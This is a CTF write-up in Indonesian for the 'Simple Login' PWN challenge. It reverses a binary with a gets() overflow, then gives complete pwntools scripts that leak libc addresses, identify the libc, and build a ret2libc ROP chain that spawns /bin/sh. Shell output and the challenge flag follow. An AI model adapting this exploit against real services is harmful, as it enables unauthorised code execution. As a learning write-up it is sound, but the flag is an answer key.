# Simple Login
Category: PWN

Points: 1000 PTS

Solves: 1

Challenge Description: 

    login login login

    nc 172.20.12.248:1337

Artifact Files:
* [chall]()

## Solution
Pertama-tama kita reverse dulu chall nya menggunakan IDA
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[64]; // [rsp+0h] [rbp-60h] BYREF
  char s[32]; // [rsp+40h] [rbp-20h] BYREF

  setvbuf(stream: stdin, buf: nullptr, modes: 2, n: 0);
  setvbuf(stream: stdout, buf: nullptr, modes: 2, n: 0);
  setvbuf(stream: stderr, buf: nullptr, modes: 2, n: 0);
  puts(s: "Username: ");
  fgets(s, n: 32, stream: stdin);
  s[strcspn(s, reject: "\n")] = 0;
  strncpy(dest: welcome_name, src: s, n: 0x1Fu);
  byte_4040BF = 0;
  puts(s: "Password: ");
  gets(a1: v4);
  printf(format: "Welcome %s", welcome_name);
  return 0;
}
```
Di sini program menggunakan fungsi gets yang mana tidak aman dan bisa terjadi overflow.

Saya menggunakan cyclic untuk menemukan offset dari ret nya dan didapat offset 135.
```
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   45 Symbols        No    0      4chall
```

Kemudian saya cek protectionnya, di sini ada NX enabled, jadi shellcode tidak bisa. Karena ada No PIE dan kisi-kisi ctf nya ada ret2libc, di sini saya mencoba pendekatan blind libc dengan leak fungsi puts dan setvbuf.

**Solver Leak puts dan setvbuf**
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("172.20.12.248", 1337)

    return r


def main():
    r = conn()


    PUTS_PLT = exe.plt['puts']
    PUTS_GOT = exe.got['puts']
    SETBUF_GOT = exe.got['setvbuf']
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    MAIN = exe.symbols['main']

    log.info("Puts@plt: " + hex(PUTS_PLT))
    log.info("Pop rdi gadget: " + hex(POP_RDI))

    OFFSET = ("A"*135).encode() 

    payload1 = OFFSET
    payload1 += p64(POP_RDI) 
    payload1 += p64(SETBUF_GOT) 
    payload1 += p64(PUTS_PLT)
    payload1 += p64(MAIN) 

    r.sendline(payload1)
    r.recvline()
    r.recvline()
    recieved = r.recvline().strip()
    print(recieved)
    leak_bytes = recieved.split(b'A' * 31)[1]
    leak = u64(leak_bytes.ljust(8, b'\x00'))
    log.info("Setbuf LEAK: " + hex(leak))

    payload2 = OFFSET
    payload2 += p64(POP_RDI)
    payload2 += p64(PUTS_GOT) 
    payload2 += p64(PUTS_PLT)
    payload2 += p64(MAIN)
    r.sendline(payload2)
    r.recvline()
    r.recvline()

    recieved = r.recvline().strip()
    leak_bytes = recieved.split(b'A' * 31)[1]
    leak = u64(leak_bytes.ljust(8, b'\x00'))
    log.info("PUTS LEAK: " + hex(leak))


    r.interactive()


if __name__ == "__main__":
    main()

```
**output:**
```
[*] Loaded 6 cached gadgets for './chall_patched'
[+] Opening connection to 172.20.12.248 on port 1337: Done
[*] Puts@plt: 0x401040
[*] Pop rdi gadget: 0x401287
b'Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0\x96)\xb1\x0e\x7f'
[*] Setbuf LEAK: 0x7f0eb1299630
[*] PUTS LEAK: 0x7f0eb1298cc0
[*] Switching to interactive mode
```
nah di sini kita dapat leaknya, di mana 3 byte terakhirnya selalu sama. Di sini saya mencoba input ke 3 byte terakhirnya ke [database libc](<https://libc.rip/>).
Setelah mencari libc yang sesuai, saya menemukan libc6_2.39-0ubuntu8.9_amd64 adalah libc yang dipakai di server.

Sekarang tinggal di leak aja deh libc base addresnya dan spawn /bin/sh.

**Solver:**
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc6_2.39-0ubuntu8.9_amd64.so")
context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("172.20.12.248", 1337)

    return r


def main():
    r = conn()


    PUTS_PLT = exe.plt['puts']
    PUTS_GOT = exe.got['puts']
    SETBUF_GOT = exe.got['setvbuf']
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    RET = (rop.find_gadget(['ret']))[0] 
    MAIN = exe.symbols['main']

    log.info("Puts@plt: " + hex(PUTS_PLT))
    log.info("Pop rdi gadget: " + hex(POP_RDI))

    OFFSET = ("A"*135).encode()
    payload1 = OFFSET
    payload1 += p64(POP_RDI) 
    payload1 += p64(SETBUF_GOT) 
    payload1 += p64(PUTS_PLT)
    payload1 += p64(MAIN)

    r.sendline(payload1)
    r.recvline()
    r.recvline()
    recieved = r.recvline().strip()
    print(recieved)
    leak_bytes = recieved.split(b'A' * 31)[1]
    leak = u64(leak_bytes.ljust(8, b'\x00'))
    log.info("Setbuf LEAK: " + hex(leak))

    payload2 = OFFSET
    payload2 += p64(POP_RDI)
    payload2 += p64(PUTS_GOT) 
    payload2 += p64(PUTS_PLT)
    payload2 += p64(MAIN)

    r.sendline(payload2)
    r.recvline()
    r.recvline()
    recieved = r.recvline().strip()
    leak_bytes = recieved.split(b'A' * 31)[1]
    leak = u64(leak_bytes.ljust(8, b'\x00'))
    log.info("PUTS LEAK: " + hex(leak))

    libc.address = leak - libc.sym["puts"]
    #build binsh
    BINSH = next(libc.search("/bin/sh"))
    SYSTEM = libc.sym["system"]

    PAYLOAD3 = OFFSET
   # PAYLOAD3 += p64(RET)
    PAYLOAD3 += p64(POP_RDI)
    PAYLOAD3 += p64(BINSH)
    PAYLOAD3 += p64(RET)
    PAYLOAD3 += p64(SYSTEM)
    r.sendline(PAYLOAD3)

    r.interactive()


if __name__ == "__main__":
    main()

```
**OUTPUT**
```
Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ ls
chall
core
flag.txt
$ cat flag.txt
NevComp3.0{basic_ret2libc_ggwp...sengaja_gk_kasih_libc_biar_cari_libc_nya_sendiri_fdec58ec61d}$  
```
FLAG : NevComp3.0{basic_ret2libc_ggwp...sengaja_gk_kasih_libc_biar_cari_libc_nya_sendiri_fdec58ec61d}

---
[Back to home](./Nevcomp2027_Alfonsus.md)